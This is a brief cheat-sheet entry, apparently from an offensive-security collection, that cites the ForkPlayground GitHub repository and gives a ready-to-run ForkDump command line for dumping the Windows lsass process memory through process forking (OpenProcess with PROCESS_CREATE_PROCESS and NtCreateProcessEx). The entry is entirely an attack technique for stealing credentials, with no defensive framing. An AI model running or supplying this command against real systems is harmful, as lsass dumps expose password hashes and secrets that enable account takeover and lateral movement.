### Source
https://github.com/D4stiny/ForkPlayground  

### Use OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ProcessId) and NtCreateProcessEx functions to dump lsass process
```
ForkDump.exe &lt;outfile&gt;.dmp (Get-Process lsass).id
```


